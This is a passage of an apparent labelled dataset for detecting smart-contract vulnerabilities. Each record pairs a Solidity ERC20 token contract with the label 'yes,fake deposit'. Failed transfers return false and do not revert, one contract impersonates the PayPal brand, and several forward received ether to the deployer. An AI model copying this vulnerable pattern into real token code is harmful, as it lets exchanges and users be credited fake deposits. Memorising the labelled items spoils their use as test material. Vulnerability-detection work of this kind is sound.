(bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "\n\npragma solidity ^0.4.20;\n\ncontract Token {\n\n function totalSupply() constant returns (uint256 supply) {}\n \n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n\n}\n\n\ncontract StandardToken is Token {\n\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n\n if (balances[msg.sender] >= _value && _value > 0) {\n\n balances[msg.sender] -= _value;\n\n balances[_to] += _value;\n\n Transfer(msg.sender, _to, _value);\n\n return true;\n\n } else { return false; }\n\n }\n\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n\n balances[_to] += _value;\n\n balances[_from] -= _value;\n\n allowed[_from][msg.sender] -= _value;\n\n Transfer(_from, _to, _value);\n\n return true;\n\n } else { return false; }\n\n }\n\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n\n return balances[_owner];\n\n }\n\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n\n allowed[msg.sender][_spender] = _value;\n\n Approval(msg.sender, _spender, _value);\n\n return true;\n\n }\n\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n\n return allowed[_owner][_spender];\n\n }\n\n\n mapping (address => uint256) balances;\n\n mapping (address => mapping (address => uint256)) allowed;\n\n uint256 public totalSupply;\n\n}\n\n\n//name this contract whatever you'd like\n\ncontract HAZARDToken is StandardToken {\n\n\n function () {\n\n //if ether is sent to this address, send it back.\n\n throw;\n\n }\n\n\n \n\n\n \n\n string public name; //fancy name: eg Simon Bucks\n\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n\n string public symbol; //An identifier: eg SBX\n\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n\n\n function HAZARDToken(\n\n ) {\n\n balances[msg.sender] = 100000000000000; // Give the creator all initial tokens (100000 for example)\n\n totalSupply = 100000000000000; // Update total supply (100000 for example)\n\n name = \"HAZARD\"; // Set the name for display purposes\n\n decimals = 8; // Amount of decimals for display purposes\n\n symbol = \"HAZARD\"; // Set the symbol for display purposes\n\n }\n\n\n \n\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n\n allowed[msg.sender][_spender] = _value;\n\n Approval(msg.sender, _spender, _value);\n\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n\n return true;\n\n }\n\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "//SPDX-License-Identifier: Unlicense\n\n// ----------------------------------------------------------------------------\n// 'BurgerandFries' token contract\n//\n// Symbol : BF \ud83c\udf54\ud83c\udf5f\n// Name : Burger and Fries\n// Total supply: 100000000000000\n// Decimals : 18\n// Burned : 50%\n// ----------------------------------------------------------------------------\n\npragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract BurgerandFries is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000000*10**uint256(decimals);\n string public constant name = \"Burger and Fries\";\n string public constant symbol = \"BF \ud83c\udf54\ud83c\udf5f\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract SkyMomoInu is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000000*10**uint256(decimals);\n string public constant name = \"Sky Momo Inu\";\n string public constant symbol = \"SMOMO\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "//SPDX-License-Identifier: Unlicense\n\n// ----------------------------------------------------------------------------\n// 'FlokiBone' token contract\n//\n// Symbol : FBONE \ud83c\udf56\n// Name : Floki Bone\n// Total supply: 100,000,000,000,000\n// Decimals : 18\n// Burned : 50%\n// ----------------------------------------------------------------------------\n\npragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract FlokiBone is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 100000000000000*10**uint256(decimals);\n string public constant name = \"Floki Bone\";\n string public constant symbol = \"FBONE \ud83c\udf56\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\ncontract ERC20Token is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n string public name; //Name of the token\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals\n string public symbol; //An identifier: eg AXM\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THE FOLLOWING VALUES FOR YOUR TOKEN!\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 20000000000000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 20000000000000000; // Update total supply (100000 for example)\n name = \"CARBON\"; // Set the name for display purposes\n decimals = 8; // Amount of decimals\n symbol = \"CRB\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.5.0;\n\n\ninterface ERC20Interface {\n \n function totalSupply() external view returns (uint256);\n\n \n function balanceOf(address account) external view returns (uint256);\n\n \n function transfer(address recipient, uint256 amount) external returns (bool);\n\n \n function allowance(address owner, address spender) external view returns (uint256);\n\n \n function approve(address spender, uint256 amount) external returns (bool);\n\n \n function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n\n \n event Transfer(address indexed from, address indexed to, uint256 value);\n\n \n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\ncontract ERC20Base is ERC20Interface {\n // Empty internal constructor, to prevent people from mistakenly deploying\n // an instance of this contract, which should be used via inheritance.\n // constructor () internal { }\n // solhint-disable-previous-line no-empty-blocks\n\n mapping (address => uint256) public _balances;\n mapping (address => mapping (address => uint256)) public _allowances;\n uint256 public _totalSupply;\n\n function transfer(address _to, uint256 _value) public returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (_balances[msg.sender] >= _value && _value > 0) {\n _balances[msg.sender] -= _value;\n _balances[_to] += _value;\n emit Transfer(msg.sender, _to, _value);\n return true;\n } else { \n return false;\n }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (_balances[_from] >= _value && _allowances[_from][msg.sender] >= _value && _value > 0) {\n _balances[_to] += _value;\n _balances[_from] -= _value;\n _allowances[_from][msg.sender] -= _value;\n emit Transfer(_from, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return _balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) public returns (bool success) {\n _allowances[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) public view returns (uint256 remaining) {\n return _allowances[_owner][_spender];\n }\n \n function totalSupply() public view returns (uint256 total) {\n return _totalSupply;\n }\n}\n\ncontract VGPrime is ERC20Base {\n\n string private _name;\n string private _symbol;\n uint8 private _decimals;\n \n constructor (string memory name, string memory symbol, uint8 decimals, uint256 initialSupply) public payable {\n _name = name;\n _symbol = symbol;\n _decimals = decimals;\n _totalSupply = initialSupply;\n _balances[msg.sender] = initialSupply;\n }\n\n \n function name() public view returns (string memory) {\n return _name;\n }\n\n \n function symbol() public view returns (string memory) {\n return _symbol;\n }\n\n \n function decimals() public view returns (uint8) {\n return _decimals;\n }\n\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "// SPDX-License-Identifier: MIT\n\npragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract PayPal_Official_Token is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000000*10**uint256(decimals);\n string public constant name = \"PayPal\";\n string public constant symbol = \"PAYPAL\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "\n\npragma solidity 0.4.19;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint _value);\n event Approval(address indexed _owner, address indexed _spender, uint _value);\n}\n\ncontract RegularToken is Token {\n\n function transfer(address _to, uint _value) returns (bool) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n if (balances[msg.sender] >= _value && balances[_to] + _value >= balances[_to]) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint _value) returns (bool) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value >= balances[_to]) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint _value) returns (bool) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint) balances;\n mapping (address => mapping (address => uint)) allowed;\n uint public totalSupply;\n}\n\ncontract UnboundedRegularToken is RegularToken {\n\n uint constant MAX_UINT = 2**256 - 1;\n\n /// @dev ERC20 transferFrom, modified such that an allowance of MAX_UINT represents an unlimited amount.\n /// @param _from Address to transfer from.\n /// @param _to Address to transfer to.\n /// @param _value Amount to transfer.\n /// @return Success of transfer.\n function transferFrom(address _from, address _to, uint _value)\n public\n returns (bool)\n {\n uint allowance = allowed[_from][msg.sender];\n if (balances[_from] >= _value\n && allowance >= _value\n && balances[_to] + _value >= balances[_to]\n ) {\n balances[_to] += _value;\n balances[_from] -= _value;\n if (allowance < MAX_UINT) {\n allowed[_from][msg.sender] -= _value;\n }\n Transfer(_from, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n}\n\ncontract STSToken is UnboundedRegularToken {\n\n uint public totalSupply = 33*10**25;\n uint8 constant public decimals = 18;\n string constant public name = \"STARFISH\";\n string constant public symbol = \"STS\";\n\n function STSToken() {\n balances[msg.sender] = totalSupply;\n Transfer(address(0), msg.sender, totalSupply);\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.6;\n\ncontract SafeRune {\n string public name = 'Safu Rune';\n uint8 public decimals = 18;\n string public symbol = 'SafuRune';\n string public version = '1.0';\n uint256 public totalSupply = 0;\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n\n Erc20Rune erc20RuneContract = Erc20Rune(0x3155BA85D5F96b2d030a4966AF206230e46849cb);\n\n function transfer(address _to, uint256 _value) public returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n emit Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n emit Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function approve(address _spender, uint256 _value ) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) public view returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return balances[_owner];\n }\n\n function RedeemErc20Rune(uint256 amount) public {\n if(!erc20RuneContract.transfer(msg.sender, amount)) revert();\n balances[msg.sender] -= amount;\n totalSupply -= amount;\n emit Transfer(msg.sender, address(this), amount);\n }\n\n function MintSafeRune(uint256 amount) public {\n // transferTo always returns true so theres no reason to check the return value. Reverts on fail\n erc20RuneContract.transferTo(address(this), amount);\n balances[msg.sender] += amount;\n totalSupply += amount;\n emit Transfer(address(this), msg.sender, amount);\n }\n}\n\ninterface Erc20Rune {\n function transferTo(address recipient, uint256 amount) external returns (bool);\n function transfer(address _to, uint256 _value) external returns (bool success);\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract dFund is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000*10**uint256(decimals);\n string public constant name = \"dFund\";\n string public constant symbol = \"DFND\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n \n function () external payable {\n teamAddress.transfer(msg.value);\n }\n\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n\n \n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract ColossalShibaInu is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000000*10**uint256(decimals);\n string public constant name = \"Colossal Shiba Inu\";\n string public constant symbol = \"COLINU\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity 0.4.19;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint remaining) {}\n\n event Transfer(address indexed _from, address 